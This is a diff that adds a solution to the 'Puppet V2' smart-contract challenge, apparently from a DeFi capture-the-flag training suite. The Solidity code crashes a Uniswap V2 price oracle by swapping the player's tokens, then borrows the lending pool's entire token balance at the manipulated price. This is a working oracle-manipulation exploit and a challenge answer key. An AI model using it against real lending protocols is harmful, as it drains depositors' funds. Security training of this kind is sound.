@@ -99,6 +99,26 @@ contract PuppetV2Challenge is Test {
      */
     function test_puppetV2() public checkSolvedByPlayer {
         
+        // 1. Player swaps all its tokens for WETH
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            path,
+            player,
+            block.timestamp * 2
+        );
+
+        // 2. Player deposits its ETH to mint WETH
+        weth.deposit{value: player.balance}();
+
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
